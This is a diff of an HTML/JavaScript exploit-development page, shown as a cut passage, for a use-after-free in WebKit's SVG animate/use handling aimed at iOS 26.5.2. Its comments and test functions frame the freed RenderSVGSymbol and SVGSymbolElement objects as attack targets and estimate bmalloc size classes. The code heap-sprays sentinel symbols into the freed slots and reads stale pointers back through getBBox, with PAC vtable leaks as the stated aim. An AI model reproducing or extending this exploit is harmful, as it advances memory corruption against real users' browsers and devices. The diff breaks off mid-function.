@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v7 · use re-attach → freed RenderSVGSymbol read</title>
+<title>SVG animate UAF v8 · sym1 removal + tight spray into freed RenderSVGSymbol</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,22 +17,27 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v7 · use re-attach → freed RenderSVGSymbol → raw heap read · iOS 26.5.2</h2>
+<h2>SVG animate UAF v8 · LK ZERO window spray · iOS 26.5.2 A16 arm64e</h2>
 <div class="sub">
-  v6 ANALYSIS: render obj NEVER freed by DOM removal of sym1. RenderSVGUse holds
-  RefPtr to RenderSVGSymbol — survives sym1 DOM removal. LK showed 0→150 (lazy attach),
-  not 150→0 (teardown). ZERO-B cases = animation hadn't cached yet, not teardown.
-  v7 FIX: remove useEl from DOM → RenderSVGSymbol ref dropped → freed → spray → re-add useEl
-  → animation cache still has stale SVGElement* → getBBox follows stale ptr → freed render obj.
-  NEW PRIMITIVE: read freed RenderSVGSymbol bytes (render obj ~512B, full of ptrs).
+  v7 ANALYSIS: UR 16/16 SURVIVED — animation cache ptr lives through useEl removal.
+  BUT WebKit re-creates RenderSVGSymbol immediately on re-add (sync, before JS runs).
+  So stale ptr → new render obj at different addr → fresh geometry → always 150.
+
+  v8 FIX: use the LK ZERO window (v6 proved: after sym1.remove() passes 1-2 return 0).
+  That ZERO window = RenderSVGSymbol is FREED, sym1 DOM obj still in heap.
+  Strategy: sym1.remove() → spray IMMEDIATELY (no yield) → tight getBBox loop →
+  catch transition from 0 to non-150 = our spray bytes read through stale ptr.
+
+  Also testing: BOTH removals (sym1 + useEl) → different freed sizes → double spray.
+  Also: spray with SVGSymbolElement-sized objects to hit the DOM obj freed slot.
 </div>
 <div id="controls">
-  <button onclick="runUR()">UR use re-attach</button>
-  <button onclick="runUS()">US use re-attach + spray</button>
-  <button onclick="runUP()">UP ptr decode</button>
-  <button onclick="runUD()">UD double-free window</button>
-  <button onclick="runUV()">UV vtable read</button>
-  <button onclick="runCRASH()">CRASH</button>
+  <button onclick="runZW()">ZW zero-window spray</button>
+  <button onclick="runDB()">DB dual removal spray</button>
+  <button onclick="runSZ()">SZ size class hunt</button>
+  <button onclick="runIM()">IM immediate read no spray</button>
+  <button onclick="runFF()">FF free-fill detect</button>
+  <button onclick="runCT()">CT controlled transition</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -41,75 +46,89 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * UAF v7: use element re-attachment → freed RenderSVGSymbol
+ * UAF v8: LK ZERO window — spray into freed RenderSVGSymbol during the 0→150 gap
  *
- * v6 LK ANALYSIS:
- *   LK showed 0→150 transitions (NOT 150→0).
- *   t0: pass=0,1,2 → 0.0 ; pass=3 → 150.0
- *   This means: render obj was NOT YET attached when animation fired.
- *   WebKit creates RenderSVGSymbol LAZILY on first layout/getBBox.
- *   Once created, it is kept alive by RenderSVGUse's internal reference.
+ * v7 LEARNINGS:
+ *   UR 16/16 survived: animation cache ptr is PERSISTENT through useEl removal.
+ *   US: all baseline — WebKit creates NEW RenderSVGSymbol synchronously on appendChild.
+ *   The stale animation ptr != the new render obj addr; WebKit resolves fresh on getBBox.
  *
- *   RT ZERO-B cases (t0,1,2,5,9): A=0.0 means animation had NOT cached
- *   sym1 ptr yet when we called getBBox-A. The 35ms sleep is not reliable.
- *   On those trials, render obj was never created for sym1.
+ * ROOT CAUSE CLARIFICATION:
+ *   When useEl is re-added, WebKit's renderTreeBuilder immediately creates a new
+ *   RenderSVGSymbol for sym1. The animation ptr (stale SVGElement* to sym1) is still
+ *   valid as a DOM ptr (sym1 is in DOM), so when getBBox resolves it walks:
+ *     stale_SVGElement_ptr → sym1 DOM obj (valid, sym1 still in DOM) → sym1.renderer()
+ *     → NEW RenderSVGSymbol (freshly created on re-add) → fresh geometry → 150
  *
- *   CONFIRMED: RenderSVGSymbol NEVER gets freed as long as:
- *     1. useEl remains in the DOM/render tree
- *     2. useEl's animation cache holds sym1 ptr
+ *   The stale ptr IS valid as long as sym1 is in the DOM. The render obj IS freed and
+ *   re-created. But WebKit goes THROUGH the DOM ptr to reach the render obj, not via
+ *   the stale render ptr directly.
  *
- * NEW ATTACK — USE RE-ATTACHMENT:
+ * WHAT getBBox ACTUALLY DOES:
+ *   SVGUseElement::getBBox() calls:
+ *     → referenceElement() (returns stale SVGElement* from animation cache)
+ *     → referenceElement->renderer() (gets renderer FROM the DOM element)
+ *     → renderer->getBBox() (calls geometry on LIVE render obj)
+ *   So as long as sym1 DOM obj is live (in memory), getBBox goes:
+ *     stale_SVG_ptr → valid DOM obj → renderer → geometry
+ *   The stale SVG ptr IS dereferenceable as long as sym1 is in the DOM.
  *
- *   SETUP:
- *     1. Create sym1, sym2, useEl with animation caching sym1 ptr [sleep 60ms]
- *     2. Verify animation cached: getBBox() returns 150.0
- *     3. Remove useEl from DOM → RenderSVGUse is destroyed → drops RefPtr to RenderSVGSymbol
- *        → RenderSVGSymbol ref count hits 0 → FREED → goes to bmalloc free list
- *        NOTE: sym1 DOM node is NOT removed — only useEl
- *        BUT: the animation element inside useEl is also removed → animation stops
- *        HOWEVER: WebKit may keep the animation state / cached ptr even after removal
+ *   IF sym1 is REMOVED FROM DOM: sym1.remove() → SVGSymbolElement obj may or may not
+ *   be freed immediately. If freed → stale ptr now truly dangling → getBBox crashes or
+ *   reads freed C++ obj bytes → UAF!
  *
- *   THE QUESTION: does the SVGAnimationElement (child of useEl) retain its cached
- *   targetElement ptr after useEl is removed from DOM?
- *     - If yes: re-adding useEl → animation restarts → getBBox follows stale ptr
- *       → RenderSVGSymbol was freed (by useEl removal) → dangling render ptr read
- *     - If no: animation cache cleared on removal → no UAF from re-attachment
+ * v8 HYPOTHESIS:
+ *   The LK ZERO window (v6) happened because: sym1.remove() frees the DOM obj,
+ *   AND the stale SVGElement* ptr now points to freed memory. getBBox dereferences
+ *   the freed SVGSymbolElement object, reads its (zeroed/freed) renderer() field,
+ *   gets nullptr → geometry returns 0.
  *
- *   SPRAY WINDOW (if yes):
- *     After useEl.remove() → RenderSVGSymbol freed → slot in bmalloc
- *     Spray DOM objects (same size as RenderSVGSymbol ~384-512B) into freed slot
- *     Re-add useEl → animation reads stale ptr → our spray object at that addr
- *     getBBox → reads OUR spray data → controlled read
+ *   After a few ticks the animation cycles to sym2 (still alive) → returns 150.
  *
- * RENDERSVGSYMBOL SIZE ESTIMATE:
- *   RenderSVGContainer (base): ~0x1C0 (448 bytes)
- *   + RenderSVGSymbol members: ~0x40 (64 bytes)
- *   Total: ~0x200 (512 bytes) → bmalloc size class 512
- *   Different from SVGSymbolElement (DOM node, ~352B)
+ *   THE 0 RESULT IS THE UAF READ. WE ARE READING THE FREED SVGSymbolElement.
  *
- * WHAT TO SPRAY INTO THE FREED RENDER SLOT:
- *   Need objects ~512B that we control:
- *   - Larger SVGElement nodes (SVGFilterElement, SVGClipPathElement)
- *   - Text nodes with long content (TextNode ~64B header + string → different size)
- *   - SVGAnimationElement itself (~400-512B?)
- *   - ArrayBuffer view (wrong heap, ruled out)
- *   - Use mkSentinelNode() that creates elements with controlled attribute data
+ * v8 STRATEGY:
+ *   1. Remove sym1 from DOM → SVGSymbolElement freed → stale SVGElement* dangles
+ *   2. IMMEDIATELY (no yield, no sleep) spray SVGSymbolElement-sized objects
+ *      to land in the freed slot
+ *   3. Call getBBox in tight loop → if our spray landed → returns our controlled bytes
+ *      as if they were geometry → non-zero, non-geometry value = spray captured
  *
- * ALTERNATIVE READ PATH (no re-attachment):
- *   After useEl.remove() → render obj freed
- *   Create NEW useEl with same animation → animation re-caches sym1 ptr
- *   getBBox on new useEl → follows sym1 ptr → FREED render obj (not re-created yet)
- *   The render obj for sym1 is freed and NOT re-created until sym1 is re-rendered
- *   New useEl renders → needs sym1 render → tries to create new RenderSVGSymbol
- *   But we've sprayed into the old slot → WebKit creates render obj AT A DIFFERENT ADDR
- *   → stale animation ptr → old freed addr → our spray
+ * SIZING:
+ *   SVGSymbolElement inherits: SVGElement → Element → Node → EventTarget
+ *   Estimated size on arm64:
+ *     EventTarget:   ~48B
+ *     Node:          +~128B → ~176B
+ *     Element:       +~96B  → ~272B
+ *     SVGElement:    +~48B  → ~320B
+ *     SVGSymbolElement: +~48B → ~368B → rounds to 384B in bmalloc
+ *   bmalloc size classes near 384B: 320, 384, 448 → try all three
  *
- * v7 STRATEGY:
- *   UR: confirm animation ptr survives useEl removal/re-addition
- *   US: spray during useEl-removal window → check if controlled bytes returned
- *   UP: decode raw bytes from freed RenderSVGSymbol (what ptrs are at what offsets)
- *   UD: double-free window test (remove useEl twice, spray between)
- *   UV: vtable read from freed render obj → arm64 PAC vtable leak
+ * WHAT TO SPRAY (DOM objects ~384B):
+ *   - SVGSymbolElement with controlled geometry (same size as target)
+ *   - SVGMarkerElement (~380B?)
+ *   - SVGPatternElement (~390B?)
+ *   - HTMLDivElement with attributes (~300-400B?)
+ *   - SVGGradientElement (~350-380B?)
+ *
+ *   For GEOMETRY LEAK: we want objects where the FIELD at the same offset as
+ *   SVGSymbolElement::m_renderer (the renderer ptr field) contains a known value.
+ *   We cannot directly control the m_renderer field (it's set by WebKit internally).
+ *
+ *   BETTER: spray with SVGSymbolElement objects that have DIFFERENT geometry.
+ *   If our spray SVGSymbol lands in sym1's freed slot, getBBox returns OUR sym's geometry.
+ *   That's a controlled geometry leak → proves we hit the freed slot.
+ *   sym1 has rects at x=0,20,40,60 w=15 → width=75 in viewBox → getBBox=150 in 200×200 SVG
+ *   Spray sym with single rect at x=0 w=99 h=99 → width=99 in viewBox → getBBox=198 in 200×200
+ *   If we see 198: our spray sym is being read as sym1 → controlled UAF read!
+ *
+ * GEOMETRY SENTINEL VALUES:
+ *   sym1 baseline: width=75 in viewBox → 150.0 in viewport (0x43160000)
+ *   spray target A: width=99 → 198.0 (0x43460000) ← distinct from baseline
+ *   spray target B: width=50 → 100.0 (0x42c80000)
+ *   spray target C: width=1  → 2.0   (0x40000000)
+ *   spray target D: width=0  → 0.0   (0x00000000) ← but this looks like ZERO window
+ *   USE TARGET A (198) — most distinct, not 0, not 150
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -126,8 +145,12 @@ window.onunhandledrejection=e=>{log(`[CRASH/rej] ${e.reason}`,'bad');};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
 function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
-function u2f(u){const b=new ArrayBuffer(4);new Uint32Array(b)[0]=u;return new Float32Array(b)[0];}
-function isPtrLike(u){const hi=u>>>24;return hi<=0x02&&u!==0;}
+function isPtrLike(u){const hi=u>>>24;return hi<=0x02&&u>0x1000;}
+function isInteresting(w,baseline=150){
+    if(Math.abs(w-baseline)<0.5)return false; // baseline
+    if(w===0)return false; // zero
+    return true;
+}
 
 async function gcLight(mb=3){
     const s=[];const C=0x40000;const N=(mb*1024*1024)/C;
@@ -138,413 +161,423 @@ async function gcLight(mb=3){
 function mkSVGHost(){
     const svg=document.createElementNS(SVG_NS,'svg');
     svg.setAttribute('width','200');svg.setAttribute('height','200');
-    svg.setAttribute('viewBox','0 0 200 200');
+    svg.setAttribute('viewBox','0 0 100 100');
     svg.style.cssText='position:fixed;left:0;top:0;width:200px;height:200px;opacity:0.01';
     document.body.appendChild(svg);return svg;
 }
-function mkSym(id,x=0,y=10,w=15,h=15,n=4){
+
+// sym1: standard — 4 rects at x=0,20,40,60 w=15 → bbox.width=75 → viewport=150
+function mkSym1(id){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    for(let i=0;i<n;i++){
+    for(let i=0;i<4;i++){
         const r=document.createElementNS(SVG_NS,'rect');
-        r.setAttribute('x',String(x+i*20));r.setAttribute('y',String(y));
-        r.setAttribute('width',String(w));r.setAttribute('height',String(h));
+        r.setAttribute('x',String(i*20));r.setAttribute('y','10');
+        r.setAttribute('width','15');r.setAttribute('height','15');
         sym.appendChild(r);
     }
     return sym;
 }
-function mkUseAnim(id,s1id,s2id){
+// sym2: alternate — 1 rect x=10 w=80 → bbox.width=90 → viewport=180 (animation target)
+function mkSym2(id){
+    const sym=document.createElementNS(SVG_NS,'symbol');
+    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
+    const r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('x','10');r.setAttribute('y','10');r.setAttribute('width','80');r.setAttribute('height','80');
+    sym.appendChild(r);
+    return sym;
+}
+// SENTINEL spray sym: 1 rect x=0 w=99 → bbox.width=99 → viewport=198
+// If getBBox returns 198: our spray landed in sym1's freed slot!
+function mkSpraySym(id){
+    const sym=document.createElementNS(SVG_NS,'symbol');
+    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
+    const r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('x','0');r.setAttribute('y','0');r.setAttribute('width','99');r.setAttribute('height','99');
+    sym.appendChild(r);
+    return sym;
+}
+// SENTINEL B: width=50 → viewport=100
+function mkSpraySymB(id){
+    const sym=document.createElementNS(SVG_NS,'symbol');
+    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
+    const r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('x','25');r.setAttribute('y','25');r.setAttribute('width','50');r.setAttribute('height','50');
+    sym.appendChild(r);
+    return sym;
+}
+
+function mkUseAnim(svg,s1id,s2id){
     const useEl=document.createElementNS(SVG_NS,'use');
     useEl.setAttribute('href',`#${s1id}`);
     const anim=document.createElementNS(SVG_NS,'animate');
     anim.setAttribute('attributeName','href');
     anim.setAttribute('values',`#${s1id};#${s2id}`);
     anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-    useEl.appendChild(anim);
+    useEl.appendChild(anim);svg.appendChild(useEl);
     return{useEl,anim};
 }
 
-// Setup: wait LONGER (80ms) for reliable animation cache
-async function setupUAF(id){
+// Setup: wait until animation caches sym1 (getBBox=150 confirmed, 5 retries)
+async function setup(id){
     const svg=mkSVGHost();
-    const sym1=mkSym(`${id}_s1`);const sym2=mkSym(`${id}_s2`);
+    const sym1=mkSym1(`${id}_s1`);const sym2=mkSym2(`${id}_s2`);
     svg.appendChild(sym1);svg.appendChild(sym2);
-    const{useEl,anim}=mkUseAnim(id,`${id}_s1`,`${id}_s2`);
-    svg.appendChild(useEl);
-    // Wait longer + verify animation actually cached sym1
-    let cached=false;
-    for(let attempt=0;attempt<5;attempt++){
+    const{useEl,anim}=mkUseAnim(svg,`${id}_s1`,`${id}_s2`);
+    let cached=false,bbPre=null;
+    for(let a=0;a<6;a++){
         await sleep(60);
-        try{const bb=useEl.getBBox();if(bb.width>100){cached=true;break;}}catch(e){}
+        try{const bb=useEl.getBBox();if(bb.width>100){cached=true;bbPre=bb;break;}}catch(e){}
     }
-    return{svg,useEl,anim,sym1,sym2,cached};
+    return{svg,useEl,anim,sym1,sym2,cached,bbPre};
 }
 
-// ── UR: use re-attach — does animation cache survive? ─────────────────
-async function runUR(q=false){
-    if(!q){dis(true);sep();log('▶ UR: use re-attach — animation cache survives removal?','inf');sep();}
-    log('[*] setup: wait for animation to cache sym1 ptr (getBBox=150)','inf');
-    log('[*] then: remove useEl → re-add useEl → getBBox again','inf');
-    log('[*] if cache survived: returns 150 (stale ptr active)','inf');
-    log('[*] if cache cleared: returns 0 (no render obj for freed sym1)','inf');
-    log('[*] if crash: stale render ptr being followed → UAF','inf');
+// ── ZW: zero-window spray ─────────────────────────────────────────────
+// After sym1.remove() — immediately spray, then tight getBBox loop
+// Looking for: 198.0 (our sentinel A) or 100.0 (sentinel B) in the readings
+async function runZW(q=false){
+    if(!q){dis(true);sep();log('▶ ZW: zero-window spray — sym1.remove() + immediate spray + tight getBBox loop','inf');sep();}
+    log('[*] sym1.remove() → spray 2048× SVGSymbolElement-sentinel → getBBox loop 20× ','inf');
+    log('[*] sentinel A: rect w=99 → getBBox should return 198.0 (0x43460000)','inf');
+    log('[*] sentinel B: rect w=50 → getBBox should return 100.0 (0x42c80000)','inf');
+    log('[*] any 198 or 100 = our spray sym landed in sym1 freed slot → CONTROLLED READ','ok');
     log('');
-    let survived=0,cleared=0,crashed=0;
+    let hit=0,crash=0,zero=0,trans=0;
     for(let t=0;t<16;t++){
-        const{svg,useEl,sym1,sym2,cached}=await setupUAF(`ur_${t}`);
-        if(!cached){log(`  t${t}: animation not cached yet (skip)`,'dim');continue;}
-        const bbBefore=useEl.getBBox();
-        // REMOVE useEl — drops RenderSVGUse → drops ref to RenderSVGSymbol → FREED
-        useEl.remove();
-        await yield_(); // let render tree update
-        void document.body.offsetHeight; // force sync layout → render obj destruction
-        // OPTIONAL: spray here to land in freed RenderSVGSymbol slot
-        // RE-ADD useEl — animation element comes with it
-        svg.appendChild(useEl);
-        void document.body.offsetHeight; // force layout of new use
-        let bbAfter=null;let didCrash=false;
-        try{bbAfter=useEl.getBBox();}catch(e){didCrash=true;crashed++;log(`  [CRASH] t${t}: ${e}`,'hi');}
-        if(!didCrash&&bbAfter){
-            const w=bbAfter.width;
-            if(Math.abs(w-bbBefore.width)<0.1){
-                log(`  [SURVIVED] t${t}: before=${bbBefore.width.toFixed(1)} after=${w.toFixed(1)} — cache intact!`,'ok');
-                survived++;
-            }else if(w===0){
-                log(`  [CLEARED] t${t}: before=${bbBefore.width.toFixed(1)} after=0 — cache cleared on removal`,'inf');
-                cleared++;
-            }else{
-                log(`  [CHANGED!] t${t}: before=${bbBefore.width.toFixed(1)} after=${w.toFixed(1)} (${f2h(w)})`,'hi');
-                survived++;
+        const{svg,useEl,sym1,sym2,cached}=await setup(`zw_${t}`);
+        if(!cached){log(`  t${t}: not cached`,'dim');continue;}
+        // Verify baseline
+        const b0=useEl.getBBox().width;
+        if(Math.abs(b0-150)>1){log(`  t${t}: baseline wrong ${b0}`,'dim');continue;}
+
+        // === THE ATTACK WINDOW ===
+        sym1.remove(); // ← SVGSymbolElement freed! stale SVGElement* in animation cache dangles
+
+        // IMMEDIATE SPRAY — no yield, no sleep, synchronous allocation
+        // Allocate 2048 SVGSymbolElement-sized objects into freed slot
+        const svgSp=mkSVGHost();
+        const spray=[];
+        // Spray A: sentinel geometry 198
+        for(let i=0;i<1024;i++){const s=mkSpraySym(`zw_a_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
+        // Spray B: sentinel geometry 100
+        for(let i=0;i<1024;i++){const s=mkSpraySymB(`zw_b_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
+
+        // TIGHT READ LOOP — read getBBox 20 times without yielding
+        const reads=[];
+        for(let p=0;p<20;p++){
+            try{
+                const bb=useEl.getBBox();reads.push(bb.width);
+            }catch(e){
+                reads.push(-1);crash++;
+                log(`  [CRASH] t${t} p=${p}: ${e}`,'hi');
+                break;
             }
         }
-        sym1.remove();sym2.remove();svg.remove();await yield_();
+
+        // Analyze reads
+        let foundSentinel=false;
+        for(let p=0;p<reads.length;p++){
+            const w=reads[p];
+            if(w===-1)break; // crash
+            const isA=Math.abs(w-198)<0.5;
+            const isB=Math.abs(w-100)<0.5;
+            const is150=Math.abs(w-150)<0.5;
+            const is180=Math.abs(w-180)<0.5; // sym2 viewport=180
+            const isZero=w===0;
+            if(isA){log(`  [HIT-A!] t${t} p=${p}: w=198 — spray sym(99) read! controlled UAF!`,'ok');hit++;foundSentinel=true;}
+            else if(isB){log(`  [HIT-B!] t${t} p=${p}: w=100 — spray sym(50) read! controlled UAF!`,'ok');hit++;foundSentinel=true;}
+            else if(isZero){if(p===0)zero++;if(t<4||isInteresting(reads[p-1]||0))log(`  [ZERO] t${t} p=${p}: 0 (freed slot read)`,'inf');}
+            else if(is180){if(t<4)log(`  t${t} p=${p}: 180 (sym2 — animation cycled)`,'dim');}
+            else if(!is150){
+                log(`  [WILD!] t${t} p=${p}: ${w.toFixed(4)} (${f2h(w)}) — non-geometry!`,'hi');
+                hit++;foundSentinel=true;
+            }
+        }
+        // Transition summary for this trial
+        const seq=reads.map(w=>{
+            if(w<0)return'X';
+            if(Math.abs(w-150)<0.5)return'B';
+            if(Math.abs(w-180)<0.5)return'S2';
+            if(w===0)return'0';
+            if(Math.abs(w-198)<0.5)return'A!';
+            if(Math.abs(w-100)<0.5)return'B!';
+            return `?${w.toFixed(1)}`;
+        }).join('→');
+        if(!foundSentinel&&t<6)log(`  t${t}: ${seq}`,'dim');
+        else if(foundSentinel)log(`  t${t} SEQ: ${seq}`,(hit>0?'ok':'dim'));
+        // count transitions
+        for(let p=1;p<reads.length;p++){if(Math.abs(reads[p]-reads[p-1])>5)trans++;}
+
+        for(const s of spray)s.remove();spray.length=0;svgSp.remove();
+        sym2.remove();svg.remove();await yield_();
     }
-    log(`\n[*] UR: survived=${survived} cleared=${cleared} crashed=${crashed}`,(survived>0?'ok':cleared>0?'inf':'bad'));
-    if(survived>0)log('[+] CACHE SURVIVES REMOVAL — stale render ptr is live after re-attach','ok');
-    if(cleared>0)log('[*] cache cleared — need different approach to preserve stale state','inf');
-    if(crashed>0)log('[+] CRASH ON RE-ATTACH — freed render obj followed → UAF','ok');
-    if(!q)dis(false);return{survived,cleared,crashed};
+    log(`\n[*] ZW: hits=${hit} zeros=${zero} transitions=${trans} crashes=${crash}`,
+        (hit>0?'ok':zero>0?'inf':'bad'));
+    if(!q)dis(false);return{hit,zero,trans,crash};
 }
 
-// ── US: use re-attach + spray ─────────────────────────────────────────
-// Between useEl.remove() and re-add: spray objects ~512B to land in freed RenderSVGSymbol
-// If cache survived: re-add → getBBox → stale ptr → our spray data
-async function runUS(q=false){
-    if(!q){dis(true);sep();log('▶ US: use re-attach + spray into freed RenderSVGSymbol slot','inf');sep();}
-    log('[*] useEl.remove() → freed slot → spray SVGFilterElement (~512B) → re-add → getBBox','inf');
-    log('[*] target: RenderSVGSymbol ~512B (render obj, bigger than DOM node)','inf');
-    log('[*] spray: SVGFilterElement, SVGClipPathElement, larger DOM nodes','inf');
+// ── DB: dual removal — free BOTH sym1 AND useEl → two freed objs → spray both ─
+// Remove sym1 → SVGSymbolElement freed (stale DOM ptr in anim cache)
+// Remove useEl → RenderSVGSymbol freed (but animation cache is in useEl's child anim)
+// Spray BOTH size classes simultaneously
+async function runDB(q=false){
+    if(!q){dis(true);sep();log('▶ DB: dual removal — sym1 + useEl both removed → double freed slots','inf');sep();}
+    log('[*] sym1.remove() + useEl.remove() simultaneously → two freed objects','inf');
+    log('[*] then spray size classes 320+384+448 → re-add only useEl → read stale','inf');
+    log('[*] expected: if anim cache survives useEl removal AND sym1 freed → double UAF','inf');
     log('');
-    // spray different element types of ~512B size
-    const sprayTypes=[
-        {
-            label:'SVGFilterElement',
-            mk:(id)=>{
-                const el=document.createElementNS(SVG_NS,'filter');
-                el.setAttribute('id',id);
-                // add children to bump size class
-                for(let i=0;i<3;i++){
-                    const fe=document.createElementNS(SVG_NS,'feColorMatrix');
-                    fe.setAttribute('type','matrix');
-                    fe.setAttribute('values',`${i} 0 0 0 0  0 ${i} 0 0 0  0 0 ${i} 0 0  0 0 0 1 0`);
-                    el.appendChild(fe);
-                }
-                return el;
-            }
-        },
-        {
-            label:'SVGClipPathElement',
-            mk:(id)=>{
-                const el=document.createElementNS(SVG_NS,'clipPath');
-                el.setAttribute('id',id);
-                for(let i=0;i<4;i++){
-                    const r=document.createElementNS(SVG_NS,'rect');
-                    r.setAttribute('x',String(i*30));r.setAttribute('y','0');
-                    r.setAttribute('width','25');r.setAttribute('height','25');
-                    el.appendChild(r);
-                }
-                return el;
-            }
-        },
-        {
-            label:'SVGSymbolElement-large',
-            mk:(id)=>{
-                const el=document.createElementNS(SVG_NS,'symbol');
-                el.setAttribute('id',id);
-                el.setAttribute('viewBox','0 0 1000 1000');
-                for(let i=0;i<8;i++){
-                    const r=document.createElementNS(SVG_NS,'rect');
-                    r.setAttribute('x',String(i*100));r.setAttribute('y','50');
-                    r.setAttribute('width','88');r.setAttribute('height','88');
-                    r.setAttribute('fill',`hsl(${i*40},80%,50%)`);
-                    el.appendChild(r);
-                }
-                return el;
-            }
-        },
-    ];
-    let captured=0;
-    for(const sprayT of sprayTypes){
-        log(`[*] spray type: ${sprayT.label}`,'inf');
-        for(let t=0;t<8;t++){
-            const{svg,useEl,sym1,sym2,cached}=await setupUAF(`us_${sprayT.label}_${t}`);
-            if(!cached){log(`  t${t}: not cached (skip)`,'dim');continue;}
-            const bbBefore=useEl.getBBox();
-            // Remove useEl → RenderSVGSymbol freed
-            useEl.remove();
-            void document.body.offsetHeight; // force render teardown
-            await yield_();
-            // SPRAY: immediately allocate into freed RenderSVGSymbol slot
-            const svgSpray=mkSVGHost();
-            const spray=[];
-            for(let i=0;i<512;i++){
-                const el=sprayT.mk(`us_sp_${sprayT.label}_${t}_${i}`);
-                svgSpray.appendChild(el);spray.push(el);
-            }
-            await yield_();
-            // RE-ADD useEl → animation still has stale SVGElement* for sym1
-            svg.appendChild(useEl);
-            void document.body.offsetHeight;
-            let bb=null;let didCrash=false;
-            try{bb=useEl.getBBox();}catch(e){didCrash=true;log(`  [CRASH] ${sprayT.label} t${t}: ${e}`,'hi');captured++;}
-            if(!didCrash&&bb){
-                const w=bb.width,h=bb.height;
-                const baseline=Math.abs(w-bbBefore.width)<0.1;
-                if(!baseline&&(w!==0||h!==0)){
-                    log(`  [CAPTURED!] ${sprayT.label} t${t}: before=${bbBefore.width.toFixed(1)} after=w${w.toFixed(4)}(${f2h(w)}) h${h.toFixed(4)}(${f2h(h)})`,'ok');
-                    captured++;
-                }else if(w===0){
-                    log(`  [ZERO] ${sprayT.label} t${t}: render cleared — stale render ptr = freed slot`,'inf');
-                }else{
-                    if(t<3)log(`  t${t}: baseline ${w.toFixed(1)} (render re-attached to sym1 fresh render)`,'dim');
-                }
-            }
-            for(const el of spray)el.remove();spray.length=0;
-            svgSpray.remove();sym1.remove();sym2.remove();svg.remove();await yield_();
-        }
-    }
-    log(`\n[*] US: ${captured} captures/crashes`,(captured>0?'ok':'inf'));
-    if(!q)dis(false);return captured;
-}
-
-// ── UP: ptr decode from freed RenderSVGSymbol ────────────────────────
-// After useEl removal (render freed), re-add useEl WITHOUT spray.
-// getBBox returns 0 if render cleared, or 150 if render re-attached.
-// But BETWEEN those states, what does the stale ptr contain?
-// Use varied timing: read getBBox at multiple points during re-attachment.
-// At some timing point the stale ptr = freed slot (not yet re-rendered)
-// → raw bytes of freed RenderSVGSymbol (or bmalloc free list metadata)
-async function runUP(q=false){
-    if(!q){dis(true);sep();log('▶ UP: ptr decode — raw bytes from freed RenderSVGSymbol in transition window','inf');sep();}
-    log('[*] reading getBBox at multiple timing points around useEl re-attachment','inf');
-    log('[*] looking for: 0x0000000X values = bmalloc free-list metadata / render obj ptrs','inf');
-    log('');
-    const timings=[0,1,2,5,10,20]; // ms delay between re-add and getBBox
-    for(const delayMs of timings){
-        log(`  [*] delay=${delayMs}ms after re-add before getBBox`,'inf');
-        for(let t=0;t<8;t++){
-            const{svg,useEl,sym1,sym2,cached}=await setupUAF(`up_${delayMs}_${t}`);
-            if(!cached){continue;}
-            useEl.remove();
-            void document.body.offsetHeight;
-            // Short settle
-            if(delayMs>0)await sleep(delayMs);
-            svg.appendChild(useEl);
-            // NO LAYOUT FORCE — read immediately
-            let bb=null;
-            try{bb=useEl.getBBox();}catch(e){log(`    [CRASH] delay=${delayMs} t${t}: ${e}`,'hi');}
-            if(bb){
-                const w=bb.width,h=bb.height;
-                const u=f2u(w),uH=f2u(h);
-                const ptr=isPtrLike(u)||isPtrLike(uH);
-                const isZero=w===0&&h===0;
-                const isBaseline=Math.abs(w-150)<0.5;
-                if(ptr){
-                    log(`    [PTR!] delay=${delayMs} t${t}: ${f2h(w)}/${f2h(h)} — arm64 ptr in freed render obj!`,'hi');
-                }else if(!isZero&&!isBaseline){
-                    log(`    [RAW!] delay=${delayMs} t${t}: ${f2h(w)}/${f2h(h)} — non-geometry value!`,'ok');
-                }else if(isZero){
-                    if(t<3)log(`    delay=${delayMs} t${t}: 0 (render freed)`,'dim');
-                }else{
-                    if(t<3)log(`    delay=${delayMs} t${t}: 150 (render re-attached)`,'dim');
-                }
-            }
-            sym1.remove();sym2.remove();svg.remove();await yield_();
-        }
-    }
-    if(!q)dis(false);
-}
-
-// ── UD: double remove window — second removal frees the NEWLY created render ─
-// After re-attach, WebKit creates a NEW RenderSVGSymbol for sym1 (if sym1 still in DOM).
-// Remove useEl again immediately AFTER re-attachment, before getBBox.
-// The new render obj is freed. Spray, then getBBox.
-// If animation cache still has stale ptr: reads from SECOND freed render slot.
-async function runUD(q=false){
-    if(!q){dis(true);sep();log('▶ UD: double re-attach → second freed RenderSVGSymbol window','inf');sep();}
-    log('[*] remove useEl → re-add (creates new render) → remove again (frees new render)','inf');
-    log('[*] the SECOND removal frees a fresh RenderSVGSymbol with known state','inf');
-    log('[*] animation cache may now point to either the 1st or 2nd freed render obj','inf');
-    log('');
-    for(let t=0;t<16;t++){
-        const{svg,useEl,sym1,sym2,cached}=await setupUAF(`ud_${t}`);
-        if(!cached){continue;}
-        const bbBefore=useEl.getBBox();
-        // First remove
-        useEl.remove();void document.body.offsetHeight;await yield_();
-        // Re-add
-        svg.appendChild(useEl);void document.body.offsetHeight;await yield_();
-        // Second remove — NOW the freshly created render obj is freed
